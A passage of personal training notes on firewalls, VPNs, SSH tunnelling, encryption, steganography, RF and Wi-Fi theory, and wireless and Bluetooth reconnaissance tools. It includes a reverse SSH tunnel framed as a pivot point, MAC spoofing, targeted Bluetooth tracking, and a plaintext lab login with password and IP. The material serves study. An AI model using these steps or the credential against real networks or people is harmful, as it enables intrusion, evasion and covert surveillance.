    sudo crontab -e
    ```

    1. Utilize crontab guru to alter the crontab documentation

## FIREWALLS

### FIREWALL BASICS

1. Host-Based FW - less expensive, that FW is only responsible for the defense of just that host machine.
    1. FW hosted on an individual computer (essentially a personal FW like a Host Based Security System
    2. Basic - separates two networks (trusted/untrusted)
    3. Basic with DMZ (semi-trusted host, such as a public website is placed on its own network)

2. Network-Based - more expensive, requires more resources to maintain services to hundreds of client
    1. Single-Layer
        1. Comprises of basic and basic with DMZ (e.g., think that FW that is hosted for the workstations at a table)
        2. Contains one DMZ
    3. Multi-Layer
        1. Contains two FW with DMZ between both

3. Stateful vs Stateless Packet Filtering
    1. Stateless = Most common method of access control, grants or denies by comparing packet's IP Header information and ACL, easy to implement

    2. Stateful = - Inspects contents of a packet in addition to examining the header information, maintains a State Table that tracks each and every connection
        1. State Table includes:
            1. \- Internal host initiated request
            2. \- Source port matches originating request
            3. \- Destination port matches originating request

4. Network Address Translation and Application Layer Gateways (ALGs)
    1. NAT:
        1. The process of transferring multiple private IP addresses, sending to the router, and the router assigning your private IP a public IP address to traverse the internet and receiving ingress and egress traffic

    2. ALGs:
        1. An application that acts on behalf of the application servers on a network, protecting the servers and applications from traffic that might be malicious.
        2. By acting as a proxy for the application servers and managing application protocols such as SIP and FTP, an application layer gateway typically uses "deep packet inspection" to detect and block attacks before initiating an application session or allowing traffic to pass to the application.

5. FW via Window CLI
    1. Disable/Enable FW from CLI
        1. `> netsh firweall set opmode <DISABLE/ENABLE>`
    2. Allow or Deny Ports
        1. `> netsh firewall add portopening TCP <port_number> <name/service> DISABLE/ENABLE ALL`

    3. Allow or Deny Specific Programs
        1. `> netsh firewall add allowedprogram <C:\path\location\service.exe> <service name> DISABLE/ENABLE ALL`

### LINUX FIREWALLS

1. Show all current rule chains
    1.
        ```bash
        sudo iptables --list
        ```
        ```bash
        sudo iptables -L
        ```
2. Drop all current rule chains
    1.
        ```bash
        sudo iptables --flush
        ```
        ```bash
        sudo iptables -F
        ```
3. Built-in Tables:
    1. MANGLE manipulates IP and TCP headers

    2. FILTER (used as the default table), used for packet filtering, has three built-in chains
        1. FORWARD - filter packets to server protected for the FW
        2. INPUT - filters packet destined "coming into" for the FW
        3. OUTPUT - filter packets originating from the FW

    3. NAT has two built-in chains
        1. Pre-routing - Changes packets when "destination address" needs changed
        2. Post-routing - Changes packets when "source address" needs to be changed
            1. DROP - packet is blocked
            2. REJECT - drops a target BUT also returns an error message to the host (e.g., --reject-with qualifier = ICMP message)
                1. NOTE: do not include reject for perimeter FW, makes you more vulnerable to adversaries
            3. MASQUERADE - used to do NAT, the src IP address is the same used by FW

    4. IPTABLES
        1. Examples:
            1. [http://linux-training.be/networking/ch14.html](http://linux-training.be/networking/ch14.html)
            2. [https://networklessons.com/uncategorized/iptables-example-configuration](https://networklessons.com/uncategorized/iptables-example-configuration)
            3. MOST USEFUL - [https://www.geeksforgeeks.org/iptables-command-in-linux-with-examples/](https://www.geeksforgeeks.org/iptables-command-in-linux-with-examples/)
        2.

            ```bash
            service iptables stop
            ```

        3.

            ```bash
            service iptables start
            ```

    5. UNCOMPLICATED FIREWALL (UFW)
        1. NOTE: Always Check if ufw rule is implemented
            1.
                ```bash
                sudo ufw status
                ```

        2. Allow by Service Name
            1.
                ```bash
                sudo ufw allow <service name>
                ```

        3. Deny by Service Name
            1.
                ```bash
                sudo ufw deny <service name>
                ```

        4. Allow by Specific IP
            1.
                ```bash
                sudo ufw allow <IP address>
                ```

        5. Allow by Specific IP and Port
            1.
                ```bash
                sudo ufw allow from <target> to <destination> port <port number>
                ```

        6. Allow by specific port , IP, and protocol
            1.
                ```bash
                sudo ufw allow from <target> to <destination> port <port number> proto <protocol name>
                ```

        7. Disable PING responses
            1.
                ```bash
                sudo nano /etc/ufw/before.rules
                ```
            2.  Change the following lines
                1.  `-A ufw-before-input -p icmp --icmp-type destination-unreachable -j DROP`
                2.  `-A ufw-before-input -p icmp --icmp-type source-quench -j DROP`
                3.  `-A ufw-before-input -p icmp --icmp-type time-exceeded -j DROP`
                4.  `-A ufw-before-input -p icmp --icmp-type parameter-problem -j DROP`
                5.  `-A ufw-before-input -p icmp --icmp-type echo-request -j DROP`

        6. fail2ban - to be used as a fail safe and triage the situation

## VPC CREATION

`Student-36 B1Gbr0therORsist3r36 216.238.68.8 4200 ssh Student-36@216.238.68.8 -p4200`

1. Process of standing up on-prem and cloud environments?
    1. Speak to Will about this...

2. Virtual Cloud Providers/Virtual Private Servers (VPS):
    1. AWS, Vultr, Digital-Ocean, Linode
        1. Infra-as-Code (IaC) - building out specifications for your servers in scripting language
            1.
                ```bash
                terraform apply -destroy
                ```

3. Use Cases (Pay as you go)
    1. Private VPNs (the way to go, highly cost effective ~.03/hour of use)
        1. Stand up server > issue out VPNs > shut down > pay the low fee for the time that you're there!
    2. Virtual Environments

## Virtual Private Servers (VPSs)

1.

    ```bash
    curl ifconfig.co
    ```

## Wireguard & OpenVPN

1. VPNs operate at the Transport Layer of OSI

### VPN Basics

Revisit VPN information for updated Wireguard Installation Slides

### OpenVPN

1. Uses default port 1194

### Wireguard (BEST VPN CHOICE)

1. Very fast, new nonstd techniques
2. Highly scalable, can generate QR codes
3.

    ```bash
    sudo apt install wireguard resolvconf -y
    ```

4.

    ```bash
    sudo wg-quick up/down wg0
    ```

## TUNNELING

1. Remote Tunnel (used when you don't have immediate access to a local network, but creates a JumpBox for ME to pivot from!)

### REMOTE PI

```bash
ssh -fN -R <From_High.Port>:localhost:<To_SSH.Port> <cloud.user>@<cloud.IP> -p<cloud.port>
```

### HOME LOCATION

```bash
ssh cloud_user@X.X.X.X -p#
```

### HOME LOCATION + CLOUD

```bash
ssh <remote_pi>@localhost -p <From_High.Port>
```

## RPI-AP-Setup

### RaspberryPI Projects

1. Purchase RPI with SD Cards
2. Download Raspberry Pi Imager
    1. used to reformat and write
3. Set credentials and AP information on RPI
4. Connect to RPI
5. Download AP script from Github to create personal router for RPI

## ENCRYPTION STANDARDS

### HEX ENCODE

1.

    ```bash
    xxd -p clear.txt > encoded.txt
    ```

    1. `-r` = revert from hex

### HEX DECODE

1.

    ```bash
    xxd -p -r encoded > plain.txt
    ```

    1. `-p` = output into file

### BASE64

1.

    ```bash
    base64 clear.txt > encoded.txt
    ```

    1. `-d` = decode

### QR CODE GENERATION

1.

    ```bash
    sudo apt install qrencode zbartools
    ```

2.

    ```bash
    qrencode -o linkup.png "Text/URL you want to enter"
    ```

    1. `-o` = output

### DECODING QR IMAGE

1.

    ```bash
    zbarimg <qr-code-image.png> > decoded.txt
    ```

    1. outputs the information into a text file that can be further be decoded or encoded

### hURL

1.

    ```bash
    hURL --help
    ```

## ENCRYPTION OF FILES

### ENCRYPT

1.

    ```bash
    openssl enc -aes-256-cbc -in <file.txt> -out <encrypted.txt>
    ```

    1. `enc` = encrypted
    2. `-aes-256-cbc` = encryption standard used, see man for other encryption types
    3. `-in` = input file you want to encrypt
    4. `-out` = output file that you want to contents to move into

### DECRYPT

1.

    ```bash
    openssl enc -aes-256-cbc -d -in encrypted.txt -out decrypted.txt
    ```

    1. `-d` = decode
    2. `-in` = in file
    3. `-out` = out file

## COMPRESSION USING 7ZIP

### Download 7zip

1.

    ```bash
    sudo apt install p7zip-full -y
    ```

### 7z a -mhe=on archive.7z -p message.txt - puts message into a pass protected 7z archive

1.

    ```bash
    7z a -mhe=on archive.7z -p message.txt
    ```

    1. `a` = archive
    2. `-mhe=on` = encryption of headers (protects full archive from snooping)***
    3. `archive.7z` = archive that you're creating to place your message.txt into

2.

    ```bash
    7z a -mhe=on archive.7z -p message.txt -sdel
    ```

    1. `-sdel` = deletes the file that you created after it's compressed and placed into an archive

### EXTRACTING USING 7ZIP

1.

    ```bash
    7z e <archive.7z>
    ```

    1. `-e` = extracting from an archive

## STEGANOGRAPHY

### EMBEDDING STEG

**Create Encrypted Archive**

1.

    ```bash
    7z a -mhe=on < archive.7z> -p <filetoarchive> -sdel
    ```

**Embed Archive**

1.

    ```bash
    steghide embed -cf <picture.jpeg> -ef <archive.7z> -sf <new_file.jpg>
    ```

    1. `-cf` = cover file
    2. `-ef` = embedded file
    3. `-sf` = newly made stegofile

### FORENSICS

1. `binwalk` = used as an enhanced file, used to tear apart files and photos

### EXTRACTIVE STEG

1.

    ```bash
    steghide extract -sf <picuture.jpeg>
    ```

## Phase I

### ENCODE

```bash
xxd -p clear.txt > encoded.txt
base64 clear.txt > secret.txt
```

### ENCRYPT

```bash
openssl enc -<aes-256-cbc> -in <file.txt> -out <encrypted.txt>
```

### ARCHIVE

```bash
7z a -mhe=on < archive.7z> -p <file-to-archive> -sdel
```

### EMBED

```bash
steghide embed -cf <picture.jpeg> -ef <archive.7z> -sf <new_file.jpg>
```

## Phase II

### SEND

`push/pull`

### EXTRACTv1

```bash
steghide extract -sf
```

### EXTRACTv2

```bash
7z e
```

### DECRYPT

```bash
openssl enc -<aes-256-cbc> -d -in <encrypted.txt> -out <decrypted.txt>
```

### DECODE

```bash
xxd -p -r <encoded.txt> > <plain.txt>
base64 -d clear.txt
```

# (3) RF Theory, Wireless Attack, and Wireshark

* **Frequency:** Number of cycles per second.
  * **High frequency:** Shorter wavelength (short distances).
  * **Low frequency:** Longer wavelength (longer distances).
  * **Inverse Relationship:** Frequency and wavelength are inversely proportional.

* **Amplitude:** Height/strength of each wave (Power).
  * Greater amplitude = higher energy (directly proportional).

* **Wavelength:** Distance of a wave per period (measured in meters).
  * Peak-to-peak or trough-to-trough distance.

* **Velocity:** Speed of light, distance/time (m/s).

* **Polarization:** Determined by the electric field or orientation of the radio wave.

* **Attenuation:** Loss of signal strength or connectivity.
  * **Path Loss:** Overall signal degradation from transmitter to receiver.
    * **Free space loss:** Signal weakening due to natural expansion in free space.
    * **Non-free space loss:** Signal weakening due to obstructions (>20% in the primary Fresnel zone).
      * Increased distance from transmitter spreads the wave front.

* **Reflection:** Radio waves bounce off dense objects.
  * Leads to misdirection of radio waves.

* **Refraction:** Radio waves bend when moving between mediums with different propagation velocities (at an angle < 90°).

* **Diffraction:** VHF/UHF waves bend around sharp edges with reduced energy.

* **Scattering:** Conversion of RF energy into heat.

* **Multipath distortion:** Reflected radio waves arriving at the receiver after the direct wave.
  * Causes signal distortion due to varying arrival times.

* **dB units:**
  * **dBi (isotropic):** Antenna gain compared to a hypothetical isotropic antenna.
  * **dBd (dipole):** Antenna gain compared to a half-wave dipole antenna (0 dBd = 2.15 dBi).
  * **dBm:** Power relative to one milliwatt.
  * **dBW:** Power relative to one watt.

### RF MATH

* **Watts to dBm:**
  * 1 W (1000 milliwatt) = 30 dBm

* **Rule of Three:**
  * +3 dB = x2 power
  * -3 dB = x1/2 power

    ```
    -3 dB = 1/2 power
    -6 dB = 1/4 power
    +3 dB = 2x power
    +6 dB = 4x power
    ```

    ![[Rule of Three.png]]

* **Rule of Ten:**
  * +10 dBm = x10 power
  * -10 dBm = x1/10 power

* **Watts to dBm Conversion:**

    ```
    1 watt = 30 dBm
    10 watts = 40 dBm
    100 watts = 50 dBm
    1000 watts = 60 dBm
    ```

    ![[dBm to Watt Conversion Table.png]]

* **Free Space Path Loss - Distance:**
  * 6dB loss when distance doubles.
  * 20dB loss when distance is multiplied by 10.

* **Non-Free Space Path Loss - Distance:**
  * 12dB loss when distance doubles.
  * 40dB loss when distance is multiplied by 10.

* **Default Loss (at 1 meter):**
  * **2.4 GHz:** -40/-12 dBm (Free Space/Non-Free Space)
  * **5 GHz:** -46/-12 dBm (Free Space/Non-Free Space)

* **Antenna Polarization:** Orientation of the electric field relative to the Earth's surface.
  * Determined by antenna structure and orientation.
  * **Types:**
    * Horizontal
    * Vertical
    * Circular

* **dBm (Received Signal Strength Indicator - RSSI):** Measurement of received signal power.

## WLAN THEORY

* **WiFi Standards:**
    ![[WiFi Standards.png]]
    ![[WiFi Standards.webp]]

* **Channels and Frequencies:**
  * **2.4 GHz Band:**
    * 11 CONUS channels.
    * 3 non-overlapping channels (1, 6, 11).
    * 20-22 MHz bandwidth.
  * **5 GHz Band:**
    * 40+ non-overlapping CONUS channels.
    * 20 MHz bandwidth.
    * 802.11n and 802.11ac allow channel bonding.

* **Download Speed vs. Distance:** Download speed decreases with distance to maintain packet fidelity.

* **WNIC Modes:**
    ![[WNIC Modes.png]]
  * **Focus:** Managed and Monitor Modes.

* **WLAN Service Sets:**
  * **Basic Service Set (BSS) = One-to-Many:**
    * Home, Small Office.
    * **BSSID:** BSS Identifier (MAC address of the Access Point).
    * **SSID:** Service Set Identifier (network name).
  * **Extended Service Set (ESS) = Many-to-Many:**
    * Campus, Hotels, Hospitals (wireless roaming).
    * **(E)SSID:** Broadcast identifier for a WLAN.
    * Infrastructure mode with multiple WAPs sharing the same SSID.
  * **Independent Basic Service Set (IBSS) = One-to-One(ish):**
    * LAN parties, mesh networks.
    * Decentralized point-to-point communication.
    * Limited to WEP encryption.
    * No router or access point present.

* **Frame Type Categories:**
  * **Management frames:** Establish, maintain, and tear down communication.
    * **Beacon:** Periodic WAP broadcast containing WLAN parameters (SSID, BSSID, channel, rates, timing, encryption).
      * Transmitted at the slowest required rate.
      * Beacon TIMESTAMPS synchronize stations (STAs).
      * Destination MAC for a Beacon is always a broadcast MAC address (FF:FF:FF:FF:FF:FF).
    * **Probe Request:** Station broadcast searching for WLAN (specific SSID or any).
      * Contains supported rates of the STA.
      * WAP responds with a Probe Response at any of these rates.
      * Sends out previous authentication information.
      * **Directed Probe:** STA requests a specific SSID.
        * Source Address: STA MAC.
        * Destination MAC: FF:FF:FF:FF:FF:FF.
        * SSID field: Name of trusted network.
      * **Broadcast Probe:** Modern STAs send empty probe requests to discover all available SSIDs.
    * **Probe Response:** WAP's answer to a Probe Request (if SSID matches).
      * Includes similar information to Beacon frames (excluding TIM).
    * **Authentication:** "Fist bump" between STA and WAP to verify 802.11 compatibility.
      * STAs must authenticate before associating (joining).
      * STAs can authenticate with multiple WAPs but associate with only one.
    * **Association Sequence:**
            1.  **Association Request:** STA requests to join the WLAN.
            2.  **Association Response:** WAP approves (or denies) and assigns Association ID (AID) to the STA (nickname for paging in Beacon's TIM).
            3.  **Disassociation:** Sent by STA or AP indicating the STA is leaving the WAP (remains authenticated). AID is disassociated.
            4.  **De-authentication:** Sent by STA or AP indicating the STA is completely done with the WAP (no longer authenticated). AID is disassociated.
  * **Control frames:** Regulate airwaves, mitigate collisions (support CSMA/CA).
  * **Data frames:** Deliver content (application/protocol information).

    ![[WireShark Search.png]]

* **Establishing Wireless Connection:**
    1. Probe Request
    2. Probe Response
    3. Authentication Request
    4. Authentication Response
    5. Association Request
    6. Association Response

    ![[Wireless Connection.png]]

## Attacking Wireless Systems

1. Reconnaissance
2. Fingerprinting
3. Wireless Penetration

### AIRMON-NG

* Used to set wireless adapter to monitoring mode.
* **Commands:**

    ```bash
    sudo airmon-ng
    ```

  * Outputs interfaces, drivers, and chipsets.

    ```bash
    sudo airmon-ng check
    ```

  * Lists processes that might interfere with monitoring mode.

    ```bash
    sudo airmon-ng check kill
    ```

  * Kills interfering processes (network manager + wpa_supplicant.service).

    ```bash
    sudo airmon-ng start <adapter(wlan1)>
    ```

  * Starts monitoring mode on the specified adapter.

    ```bash
    iwconfig
    ```

  * Shows the new monitoring interface (e.g., wlan1mon).

    ```bash
    ifconfig <adapter(wlan1mon)>
    ```

  * Checks the MAC address of the monitoring interface.

    ```bash
    sudo airmon-ng start <adapter> "#"
    ```

  * Starts monitoring mode on a specific channel.

### Living Off the Land Essential Commands

```bash
ifconfig
iwconfig
iwlist
iw
ip
dhclient
wpa_passphrase
wpa_supplicant
```

### Commands for Non-Native Packages

#### Monitor Mode (ip link)

```bash
sudo systemctl stop NetworkManager.service
sudo systemctl stop wpa_supplicant.service
iwconfig
sudo ip link set <adapater> down
sudo iw link <adapter> set monitor none
sudo ip link set <adapter> up
```

#### Monitor Mode (ifconfig)

```bash
sudo systemctl stop/start NetworkManager.service
sudo systemctl stop/start wpa_supplicant.service
iwconfig
sudo ifconfig <adapter> down
iw wlan0 set monitor none
ifconfig <adapter> up
```

### AIRODUMP-NG OPTIONS

* **Filter Method:** band > individual channel

1. **Wide Collection:**

    ```bash
    sudo airodump-ng --band abg -M wlan1mon
    ```

    * Default band is 2.4 GHz if not specified.

2. **Narrow Collection:**

    ```bash
    sudo airodump-ng -c '#' -M <wlan#mon> -w <file>
    ```

    * `--channel n (-c '#')`: Set channel to '#'.
    * `--band n (-b abg)`: Search all signals (2.4 GHz and 5 GHz).
    * `--write (-w )`: Write output to filesystem.
    * `--manufacturer (-M)`: Resolve OUI.
    * `--gpsd`: Enable GPS service.

3. **More Narrow Collection (specific BSSID):**

    ```bash
    sudo airodump-ng -c '#' --bssid <MAC address> -M <wlan#mon> -w <file>
    ```

4. **Airodump-ng Filters:**
    * `--bssid <MAC>`: Filter by WAP MAC address.
    * `--essid <SSID>`: Filter by SSID.
    * `--encrypt <ENC>`: Filter by encryption suite.
    * `--essid-regex <regex>`: Partial filtering of SSID.

5. **Airodump Options (Interactive):**
    * `"m"`: Mark selection in output.
    * `space`: Pause output.
    * `tab`: Move over to select.
    * Selecting `a`: Filter access points/stations/acknowledgements.
    * Selecting `s`: Sort by an option.

### airgraph-ng Setup and Usage

1. **Install:**

    ```bash
    sudo apt install airgraph-ng
    ```

    * Translates capture files into readable graphics (network design and associations) using CSV files.

2. **Usage:**

    ```bash
    airgraph-ng -i <in.csv> -o <out.png> -g <format>
    ```

    * Example:

        ```bash
        sudo airgraph-ng -i 01.csv -o net.png -g CAPR
        ```

        ```bash
        sudo airgraph-ng -i 01.csv -o net.png -g CPG
        ```

### ==KISMET [DIGITAL TERRAIN MAPPING (DTM) or SURVEYING] ==

* Open-source sniffer, WiFi intrusion detection system, war driver, and packet capture tool.
* Useful for building a picture of the digital terrain.

1. **Download kismet_site.conf:**

    ```bash
    wget <kismet.conf from MuppetPant GitHub>
    ```

2. **Configure kismet.conf (nano):**
    * Bluetooth: Uncomment `hci0...`
    * Wifi: Uncomment `source=wlan<#>...`

3. **Copy configuration:**

    ```bash
    sudo cp kismet_site.conf /etc/kismet/
    ```

4. **Plug in GPS Puck:**

    ```bash
    sudo dmesg | grep attached
    ```

    * Outputs the attached device.

    ```bash
    sudo gpsd /dev/<device that is attached> (ttyUSB0)
    ```

    * Interface daemon for GPS receivers.

    ```bash
    iwconfig
    ```

5. **Start Kismet:**

    ```bash
    sudo usermod -aG kismet <username>
    ```

    * Add user to the kismet group.

    ```bash
    sudo kismet
    ```

6. **Access Kismet Web Interface:**
    * Open browser and navigate to `localhost:2501`.

### KISMET TROUBLESHOOTING

```bash
sudo killall -9 kismet
```

### KISTMET KML FILE

1. **Convert to KML:**

    ```bash
    sudo kismetdb_to_kml --in (kismet file)<Kis.kismet> --out <file.kml>
    ```

2. **Install GPSPrune (for visualization):**

    ```bash
    sudo apt install gpsprune
    ```

3. **Run GPSPrune:**

    ```bash
    gpsprune <file.kml>
    ```

    * Provides a GUI view of the route taken.

### KISMET PCAP-NG

1. **Convert to PCAP-NG:**

    ```bash
    sudo kismetdb_to_pcap --in <kis.kismet> --out <drive2.pcap-ng>
    ```

2. **Open in Wireshark:**

    ```bash
    sudo wireshark <drive2.pcap-ng>
    ```

3. **Wireshark Filter (Beacons):**

    ```bash
    wlan.fc.type_subtype==8
    ```

## WIRESHARK FORMATING

1. **Creation of Profiles:**
    * `ctrl + shift + A`: Useful for transferring common operating pictures across sessions.

2. **Disable Resolution:**
    * `View > Name > Uncheck Boxes` to disable DNS resolution.

3. **Configure Time:**
    * `View > Time Display Format > UTC Time of Day (CTRL + Alt + 8)`.

4. **Editing Columns:**
    * `Right click > Column preferences > + > Add title > Add filter` (e.g., `wlan.bssid`, `wlan.ssid`).

5. **View > Wireless Toolbar**

### WIRESHARK FILTERS

```bash
wlan.ssid == #SSID
wlan.bssid == #BSSID
wlan.ds.current_channel == #BSSID channel
wlan.ra == #Receive Address
wlan.ta == #Transmit Address
wlan.da == #Destination Address
wlan.sa == #Source Address

wlan.addr == <MAC address>
    - Used to identify if the MAC address is present at all within the pcap
eapol
wlan.fc.type_subtype == x
    0 – AssociationRequest
    1 – AssociationResponse
    4 – ProbeRequest
    5 – ProbeResponse
    8 – Beacon
    10 – Disassociate
    11 – Authentication
    12 – Deauthenticate
    40 – QoSData
```

**RULE OF THUMB:** If the BSSID matches either the SA or DA.

### WIRESHARK DECRYPTION

**MANUAL:** `Edit > Preferences > Expand Protocols > IEEE802.11 > Check "Enable De-encryption" > Edit Keys > Change password type > Enter plain text password or dictionary or password`.

### Interesting Streams

```bash
TCP
UDP
HTTP
FTP
```

### EXPORT OBJECTS

`File > Export Objects > HTTP > Preview or Save`.

### WIRESHARK FILTERS

### PCAP CARVING

```bash
(wlan.bssid==<BSSID> && wlan.fc.type_subtype==8) || eapol
```

1. Filter for specific BSSID + Beacons or vulnerable WiFi signals.
2. `File > Export Specified Packets > Add Filename > Toggle Capture/Displayed`.

### GENERAL FILTERS

```bash
frame contains "XXX"
wlan.ssid contains "XXX"
```

#### CHAINING FILTERS

```bash
frame contains "XXX" <&& / ||> wlan.fc.type_subtype == 4
    - Did any devices probe request for SSID containing XXX?
frame contains "XXX" && wlan.fc.type_subtype == 8
    - Did any WAPs transmit beacons for SSID containing XXX?
```

### FRAME INFO

1. **Radio Tap Header:** RSSI value located here.
2. **Antenna Signal:** Signal strength.
3. **IEEE 802.11 Subtype:** Frame type.
4. **Frame Control Field > Flags:**
    1. DS Status
    2. Retry
    3. Protected flag
5. **Frame Control > Flags:**
    1. Receiver
    2. Destination
    3. Transmitter
    4. Source address
6. **IEEE 802.11 Wireless Management:**
    1. **Fixed Parameters > Time Stamp:** Copy and paste in calculator.
        * XXX / 1,000,000 = seconds
        * seconds / 60 = minutes
        * minutes / 60 = hours
        * hours / 24 = days
7. **IEEE 802.11 Wireless Management > Capabilities:**
    1. ESS capabilities
    2. Privacy
8. **IEEE 802.11 Wireless Management > Tagged Parameter Set:** `"SSID-value"`
9. **IEEE 802.11 Wireless Management > Tagged Parameters > HT Capabilities (802.11n D1.10):**
    1. HT Capabilities Info > HT Support Channel Width
    2. HT Information
    3. HT Information > Primary Channel:
    4. HT Information > HT Information Subset
    5. Tagged Parameters > Tag: RSN Information
        1. Group Cipher Suite > Auth Key Management
            1. RSN Capabilities
        2. Tagged Parameters > Tag: VHT Operation > VHT Operation Info
            1. Channel Width, Channel Center
        3. Tag: VHT Capabilities
            1. Supported Channel, Short GI...

## BLUETOOTH

* **BLUETOOTH EDR:** Laptops.
* **BLUETOOTH LE:** Phones and other mobile devices.

* **48 Bit Burned-in Address (BD_ADDR):**
  * **Non-Significant Address Part (NAP):**
    * Frequency Hopping Algorithm/Synchronization.
  * **Upper Address Part (UAP):**
    * Algorithm Seeding, ID.
  * **Lower Address Part (LAP):**
    * ID and tagging, clock frequency synchronization.

    ![[BD_ADDR Organization.png]]

* **Piconets:**
  * Can include 1-7 **active** > 255 **parked** slave nodes.
    ![[Piconet.png]]

* **Scatternets:** Chains of more than one Piconet.
    ![[Scatternet.png]]

* **Bluetooth Based Frames:** GIAC > DAC > CAC
  * **Sync Words:**
    * **Channel Access Code (CAC):** Connected; master’s LAP (shared during DAC).
    * **Device Access Code (DAC):** Paging; slave’s LAP (initial connection).
    * **General Inquiry Access Code (GIAC):** General inquiry; `0x9E8B33` (Discovery State).
      * Exchange of BD ADDR during discovery.
  * **Other Frames:**
    * **ID:** Short Baseband packet. "I am me." (preamble and sync word).
    * **Poll:** Access. "Do you need airtime?" (master polls slaves, requires acknowledgement).
    * **Frequency Hopping Synchronization:** Contains address, clock information.

* **Frame Sequencing:**
  * Master Nodes: Communicate on even time slots.
  * Slave Nodes: Communicate on odd time slots.

### BLUE HYDRA

```bash
sudo apt install bluez bluez-test-scripts python3-bluez python3-dbus libsqlite3-dev ubertooth ruby-dev bundler
```

```bash
git clone [https://github.com/ZeroChaos-/blue_hydra.git](https://github.com/ZeroChaos-/blue_hydra.git)
cd blue_hydra/
bundle install
cd bin/
sudo ./blue_hydra
```

### POST-OP (BLUE HYDRA)

```bash
sudo sqlitebrowser <file.db>
```

* Used for analysis after collection.
* `Browse Data > copy information and pipe the information into Blue Sonar`.

### BLUE_SONAR

**Install Repo:**

```bash
git clone [https://github.com/ZeroChaos-/blue_sonar.git](https://github.com/ZeroChaos-/blue_sonar.git)
```

**Usage:**

```bash
./blue_sonar –t <TARGET BD_ADDR> -s <sleep_period> -i <adapter>
```

**Example:**

```bash
sudo ./blue_sonar -t 18:F1:D8:DD:62:59 -s .25 -i hci0
```

### USEFUL INFORMATION

* **Identifying Stations (STA) vs Beacons (WAP):**
    1. Stations SEND ONLY PROBE REQUEST (broadcast requests with null/missing SSID).
    2. Beacons (WAPs) SEND ONLY BEACONS (indicated in the info column or filter for beacons).
    3. **Identifying Vendor IDs:**
        * Copy first 3 values of MAC address (e.g., `f0:ab:54`).
        * Look under "Source address" in Wireshark (will state "Org").
        * Paste in OUI lookup online.

* **Broadcast Address:** `ff:ff:ff:ff:ff:ff`
* **Bluetooth Network Type:** PAN (Personal Area Network)
* **Bluetooth Addresses:** `sa`, `ra`, `ta`, `da`
* **GIAC (General Inquiry Access Code):** For device discovery.

## TSHARK

1.

```bash
sudo airmon-ng check kill
```

2.

```bash
sudo airmon-ng start <interface> <channel#>
```

* Verify correct interface, monitor mode, and channel.

3.

```bash
tshark -r <file.pcap>
```

4.

```bash
tshark -i <interface> -w <file.pcap>
```

5.

```bash
tshark -i <interface> -w <file.pcap> -c 20
```

* `-c 20`: Terminate capture after 20 frames.

6.

```bash
tshark -i <interface> -w <output.pcap> -a <key:value>
```

* Define autostop conditions:
* `duration:nn`: Duration in seconds (e.g., `duration:20`).
* `filesize:xx`: Length in kilobytes (e.g., `filesize:1000`).

### FETCH FILTERING (CAPTURE ONLY)

7.

```bash
tshark -i <interface> -f "wlan type mgt subtype beacon" -w <file.cap>
```

* Filters for ONLY beacon frames.

8.

```bash
tshark -i <interface> -f "wlan type mgt subtype probe-req" -w <file.cap>
```

* Filters for ONLY probe requests.

### YANK FILTERING (DISPLAY FILTERING)

9.

```bash
tshark -r <file.pcap> -Y "<wireshark filter>"
```

* Example: `tshark -r <file.pcap> -Y "wlan.fc.type_subtype==8"` (gather all beacons).

### OUTPUT FORMATTING

10.

```bash
tshark -r <file.pcap> -Y "wlan.fc.type_subtype==8" -T fields -e wlan.bssid -e wlan.ssid
```

* `-e <value>`: Extract specific values (e.g., `wlan.sa`, `wlan.ds.current_channel`).

11.

```bash
tshark -r <file.pcap> -Y "wlan.fc.type_subtype==8" -T fields -e wlan.bssid -e wlan.ssid > file_encoded.txt
```

    - `./decode_script <file_encoded.txt>`: Decode encrypted SSIDs.

## MERGECAP

1.

```bash
mergecap -w <file.pcap> <input1> <input2> <input3>
```

## EDITCAP

1.

```bash
editcap -c <#> <input.pcap> <output.pcap>
```

* `-c`: Count to cut up pcap by #.

## AIRDECAP-NG

### WPA/2

1.

```bash
airdecap-ng -e <'SSID'> -p <passphrase> <file.pcap>
```

### WEP

1.

```bash
airdecap-ng -w <WEPKEY> <file.pcap>
```

## MAC ADDRESS SPOOFING

**NOTE:** MONITOR MODE FIRST THEN SPOOF!

![[MAC Setup.png]]

### SPOOFING (LIVING OFF THE LAND)

1.

```bash
sudo ifconifg <interface#> down
sudo ifconfig <interface#> hw ether <spoofed MAC address>
sudo ifconfig <interface#> up
sudo dhclient -r
sudo dhclient <interface#>
```

* Enables another recognized IP address and stores info in router's ARP table.

2.

```bash
sudo ip link set <interface#> down
sudo ip link set <interface#> address <spoofed MAC address>
sudo ip link set <interface#> up
sudo dhclient -r
sudo dhclient <interface#>
```

### MAC CHANGER (VIA REVERSE AND USING PROXY CHAINS ON NATIVE SYSTEM)

1.

```bash
sudo ip link set <interface> down
```

2.

```bash
sudo macchanger <options> <interface#>
```

* `-l`: Vendor list.
* `-r`: Choose random MAC address.
* `-m`: Specify MAC address.
* `-b`: Pretend to be burned-in address (BIA).
* `-p`: Reset to original permanent hardware MAC.

3.

```bash
sudo ip link set <interface#> up
```

### MAC ADDRESS PERSISTENCE

1.

```bash
nano file_with_mac.conf
```

2.

```bash
cp file_with_mac.conf /etc/NetworkManager/conf.d/
```

```bash
[device]
wifi.scan-rand-mac-address=no

[connection]
ethernet.cloned-mac-address=preserve
wifi.cloned-mac-address=preserve
```

## ANDROID

```bash
wget -q https://github.com/Muppetpants/apks
```

### Android Version 6.x

1. **Reset Phone:** `Settings > Backup & Rest > Factory Data Reset > Reset Phone > Erase Everything`.
2. **Initial Setup:** Hack your way through it.
3. **Enable Developer Mode:** `Settings > About Phone > Build Number (7x)`.
4. **Enable USB Debugging:** `Settings > Developer Options > USB Debugging`.
5. **Allow apk:** `Settings > Security > Unknown Sources`.
6. **Connect phone to Kali via USB:** Swipe from top > USB for Charging > Transfer Files.
7. **Drag and drop files to:** `"Internal Storage/Download"`.
8. **Copy from Download to Downloads:** `Settings > Storage & USB > Explore > Download > Long press > 3-dots > Copy to…> Downloads > Copy`.
9. **Install Apps:** `Home Screen > Downloads > Click APK > Install > Done`.

### Android Version 8.1.x

1. **Reset Phone:** `Settings > System > Reset Options > Erase All Data (Factory Reset) > Reset Phone > Erase Everything`.
2. **Initial Setup:** Hack your way through it.
3. **Enable Developer Mode:** `Settings > System > About Phone > Build Number (7x)`.
4. **Enable USB Debugging:** `Settings > Developer Options > USB Debugging`.
5. **Connect phone to Kali via USB:** Swipe from top > USB Charging This Device > Transfer Files.
6. **Drag 'n' Drop files to:** `"Internal Shared Storage/Download"`.
7. **Install Apps:** `Home Screen > Downloads > Click APK > Install > Done`.

## DISCOVERY COMMANDS

